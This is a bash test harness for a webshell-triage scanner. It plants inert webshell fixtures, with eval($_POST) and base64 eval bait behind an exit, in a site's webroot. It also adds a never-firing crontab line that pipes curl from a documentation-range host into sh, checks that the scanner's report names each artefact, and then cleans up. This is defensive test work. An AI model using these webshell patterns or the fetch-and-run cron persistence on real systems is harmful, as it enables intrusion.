#!/bin/bash
# =============================================================================
#  lab-check.sh -- end-to-end check of webshell-triage.sh on a real panel host
#
#  FOR LAB HOSTS ONLY. Unlike everything else in this repository, this script
#  WRITES: it plants fixture files in a site's document root and one line in
#  that site owner's crontab, runs the scanner over the whole host, checks the
#  REPORT names each planted artefact in the section that should catch it, and
#  then removes what it planted. Never run it on a host you are investigating.
#
#  Why it exists. The two other self-checks run on a synthetic tree, which is
#  how CI can run them -- and is exactly why they cannot see the defects that
#  turned up on real panels: document roots the scanner never found, log files
#  it never opened, an FTP daemon it called absent, domains it never fetched.
#  Each of those left a section empty, and an empty section reads as clean.
#  The only way to catch that class is to plant something the scanner MUST
#  find on a real install, and read the report back.
#
#  Every fixture is inert. Each PHP file begins with `exit;` and carries the
#  signature bait inside a comment, so it matches the patterns and cannot run
#  even if the web server is reachable from the internet. The cron line is
#  scheduled for 31 February, which never comes, and points at 203.0.113.0/24,
#  an address range reserved for documentation.
#
#  Usage:
#    bash tools/lab-check.sh --lab --root <document root> [options]
#      --lab            required; confirms this is a lab host
#      --root DIR       document root of one existing site on this host
#      --domain NAME    that site's domain; also runs --http and checks the
#                       site was fetched
#      --log FILE       that site's access log; appends one marked request and
#                       checks section 14 reports it (the line is left in the
#                       log -- rewriting a log a web server holds open breaks it)
#      --checksums      pass --checksums to the scanner
#      --keep           leave the fixtures in place (cleanup is otherwise always run)
#
#    exit 0  PASS          every planted artefact was reported where it belongs
#    exit 1  FAIL          at least one was not
#    exit 2  INCONCLUSIVE  could not set up, or the scanner did not complete
#
#  IR_TEST_TIMEOUT   seconds to allow the scanner (default 900)
# =============================================================================

set -u

LAB=0; ROOT=""; DOMAIN=""; LOGF=""; KEEP=0; SUMS=0
while [ $# -gt 0 ]; do
  case "$1" in
    --lab)       LAB=1; shift ;;
    --root)      ROOT="${2:-}"; shift 2 ;;
    --domain)    DOMAIN="${2:-}"; shift 2 ;;
    --log)       LOGF="${2:-}"; shift 2 ;;
    --checksums) SUMS=1; shift ;;
    --keep)      KEEP=1; shift ;;
    -h|--help)   sed -n '2,45p' "$0"; exit 0 ;;
    *) echo "unknown arg: $1"; exit 2 ;;
  esac
done

HERE=$(cd "$(dirname "$0")/.." && pwd)
SCANNER="$HERE/webshell-triage.sh"

[ "$LAB" = "1" ] || { echo "Refusing to run without --lab. This script writes to a webroot; read its header."; exit 2; }
[ "$(id -u)" = "0" ] || { echo "INCONCLUSIVE -- must run as root"; exit 2; }
[ -f "$SCANNER" ] || { echo "INCONCLUSIVE -- cannot find $SCANNER"; exit 2; }
[ -n "$ROOT" ] && [ -d "$ROOT" ] || { echo "INCONCLUSIVE -- --root must be an existing directory"; exit 2; }
ROOT=$(cd "$ROOT" && pwd -P)
case "$ROOT" in /|/home|/var|/var/www|/usr|/etc|/root) echo "INCONCLUSIVE -- --root $ROOT is not a site document root"; exit 2 ;; esac
[ -z "$LOGF" ] || [ -f "$LOGF" ] || { echo "INCONCLUSIVE -- --log $LOGF is not a file"; exit 2; }

OWNER=$(stat -c %U "$ROOT")
TOK="labcheck-$(head -c 4 /dev/urandom | od -An -tx1 | tr -d ' \n')"
REPORT="/root/$TOK.txt"

# Everything planted lives under these two directories, both named after the
# token, so cleanup removes exactly what this run created and nothing else.
DIR_UP="$ROOT/wp-content/uploads/$TOK"
DIR_MAIN="$ROOT/$TOK"
F_SIG="$DIR_UP/sig.php"
F_SUB="$DIR_MAIN/inc/loader.php"
F_RO="$DIR_MAIN/ro.php"
F_ZERO="$DIR_MAIN/zero.php"
CREATED=()          # directories this run created, outermost last
CRON_SAVED=""; CRON_HAD=0; CRON_TOUCHED=0

mkd() {  # mkdir -p, remembering every level that did not already exist
  local d=$1 missing=()
  while [ ! -d "$d" ]; do missing+=("$d"); d=$(dirname "$d"); done
  mkdir -p "$1" || return 1
  local i
  for (( i=0; i<${#missing[@]}; i++ )); do CREATED+=("${missing[$i]}"); done
}

CLEANED=0
cleanup() {
  [ "$CLEANED" = "1" ] && return; CLEANED=1     # EXIT fires again after a signal
  [ "$KEEP" = "1" ] && { echo; echo "--keep: fixtures left in place under $DIR_MAIN and $DIR_UP"; return; }
  local f d
  for f in "$F_SIG" "$F_SUB" "$F_RO" "$F_ZERO"; do
    case "$f" in "$ROOT"/*"$TOK"*) [ -e "$f" ] && { chmod u+w "$f" 2>/dev/null; rm -f -- "$f"; } ;; esac
  done
  # innermost first, as recorded. The ${a[@]+...} form: bash 4.2 (CentOS 7)
  # treats an empty array as unbound under set -u and would abort the cleanup.
  for d in ${CREATED[@]+"${CREATED[@]}"}; do
    case "$d" in "$ROOT"/*) rmdir -- "$d" 2>/dev/null ;; esac
  done
  if [ "$CRON_TOUCHED" = "1" ]; then
    if [ "$CRON_HAD" = "1" ]; then crontab -u "$OWNER" "$CRON_SAVED"; else crontab -u "$OWNER" -r 2>/dev/null; fi
  fi
  [ -n "$CRON_SAVED" ] && rm -f -- "$CRON_SAVED"
}
trap cleanup EXIT
trap 'cleanup; exit 2' INT TERM HUP

echo "lab-check $TOK"
echo "  root:   $ROOT   (owner $OWNER)"
echo "  domain: ${DOMAIN:--}   log: ${LOGF:--}   report: $REPORT"

# --- plant -------------------------------------------------------------------
mkd "$DIR_UP" && mkd "$DIR_MAIN/inc" || { echo "INCONCLUSIVE -- cannot create fixture directories"; exit 2; }
printf '<?php exit; // lab-check fixture %s, inert. Signature bait: eval($_POST["x"]);\n' "$TOK" > "$F_SIG"
printf '<?php exit; // lab-check fixture %s, inert. Signature bait: eval(base64_decode("bGFi"));\n' "$TOK" > "$F_SUB"
printf '<?php exit; // lab-check fixture %s, inert, read-only like an anti-cleanup backdoor\n' "$TOK" > "$F_RO"
: > "$F_ZERO"
chown -R "$OWNER": "$DIR_UP" "$DIR_MAIN" 2>/dev/null
chmod 444 "$F_RO"

CRON_SAVED=$(mktemp) || exit 2
if crontab -u "$OWNER" -l > "$CRON_SAVED" 2>/dev/null; then CRON_HAD=1; fi
{ [ "$CRON_HAD" = "1" ] && cat "$CRON_SAVED"
  echo "0 0 31 2 * curl -s http://203.0.113.9/$TOK.sh | sh"
} | crontab -u "$OWNER" - && CRON_TOUCHED=1

if [ -n "$LOGF" ]; then
  printf '203.0.113.77 - - [%s] "POST %s HTTP/1.1" 200 12 "-" "%s"\n' \
    "$(date '+%d/%b/%Y:%H:%M:%S %z')" "${F_SIG#$ROOT}" "$TOK" >> "$LOGF"
fi

# --- run ---------------------------------------------------------------------
ARGS=(--days 30 --out "$REPORT" --no-nice)
[ -n "$DOMAIN" ] && ARGS+=(--http)
[ "$SUMS" = "1" ] && ARGS+=(--checksums)
echo; echo "running the scanner over the whole host (auto-detection, no --root)..."
timeout "${IR_TEST_TIMEOUT:-900}" bash "$SCANNER" "${ARGS[@]}" > "/root/$TOK.stdout" 2>&1
SRC=$?
NSEC=$(grep -c '^## ' "$REPORT" 2>/dev/null); NSEC=${NSEC:-0}
echo "scanner exit: $SRC   sections: $NSEC"
if [ "$NSEC" -lt 20 ]; then
  echo "INCONCLUSIVE -- the scanner did not complete; see /root/$TOK.stdout"
  tail -n 5 "/root/$TOK.stdout" | sed 's/^/  /'
  exit 2
fi

# --- check -------------------------------------------------------------------
block() {  # everything between "## <n>" and the next section header
  awk -v want="## $1" 'index($0, want) == 1 { inb = 1; next } /^## / { inb = 0 } inb { print }' "$REPORT"
}
FAIL=0; NOK=0
check() {  # $1 description, $2 haystack, $3 needle
  if printf '%s\n' "$2" | grep -qF -- "$3"; then
    NOK=$((NOK+1)); echo "  ok      $1"
  else
    FAIL=1; echo "  MISSED  $1"; echo "          expected to find: $3"
  fi
}

echo
echo "-- detection --"
S2=$(block "2."); S5=$(block "5."); S6=$(block "6."); S12=$(block "12.")
S14=$(block "14."); S16=$(block "16."); S17=$(block "17."); S18=$(block "18.")

# The site's root, or a directory containing it, must be among the webroots.
FOUND_ROOT=""
while IFS= read -r r; do
  r=${r#"${r%%[! ]*}"}
  [ -n "$r" ] || continue          # the blank line closing the list would match everything
  case "$ROOT/" in "$r"/*) FOUND_ROOT=$r ;; esac
done < <(printf '%s\n' "$S2" | sed -n '/^webroots to scan/,/^$/p' | tail -n +2)
if [ -n "$FOUND_ROOT" ]; then NOK=$((NOK+1)); echo "  ok      document root auto-detected (as $FOUND_ROOT)"
else FAIL=1; echo "  MISSED  document root auto-detected -- $ROOT is under no scanned webroot"; fi

check "signature hit in an upload dir (section 6)"     "$S6"  "$F_SIG"
check "signature hit elsewhere in the site (section 6)" "$S6"  "$F_SUB"
check "PHP inside an upload dir (section 12)"          "$S12" "$F_SIG"
check "PHP the owner cannot write (section 16)"        "$S16" "$F_RO"
check "zero-byte PHP (section 16)"                     "$S16" "$F_ZERO"
check "site owner's crontab line (section 5)"          "$S5"  "$TOK.sh"
NART=$(printf '%s\n' "$S18" | sed -n 's/^artifacts collected: \([0-9][0-9]*\)$/\1/p' | head -n 1)
if [ "${NART:-0}" -gt 0 ]; then
  NOK=$((NOK+1)); echo "  ok      artifacts attributed to an account (section 18: $NART)"
else
  FAIL=1; echo "  MISSED  artifacts attributed to an account -- section 18 collected ${NART:-none}"
fi
[ -n "$LOGF" ] && check "planted request found in access logs (section 14)" "$S14" "$TOK"

if [ -n "$DOMAIN" ]; then
  if printf '%s\n' "$S17" | grep -qE "fetched (https?://)?$DOMAIN/"; then
    NOK=$((NOK+1)); echo "  ok      --http fetched $DOMAIN"
  else
    FAIL=1; echo "  MISSED  --http fetched $DOMAIN -- what section 17 said instead:"
    printf '%s\n' "$S17" | grep -E "$DOMAIN|no domain known|could NOT" | head -5 | sed 's/^/          /'
  fi
fi

echo
echo "-- context (not pass/fail) --"
printf '%s\n' "$S2" | grep -E '^panel detected' | sed 's/^/  /'
grep -E '^WEB SERVER:|FTP daemon:' "$REPORT" | sed 's/^ *//; s/^/  /'

echo
if [ "$FAIL" = "1" ]; then
  echo "FAIL -- the report missed at least one planted artefact ($NOK checks passed)."
  echo "        Report kept at $REPORT"
  exit 1
fi
echo "PASS -- all $NOK checks found their artefact in the report. Report kept at $REPORT"
exit 0
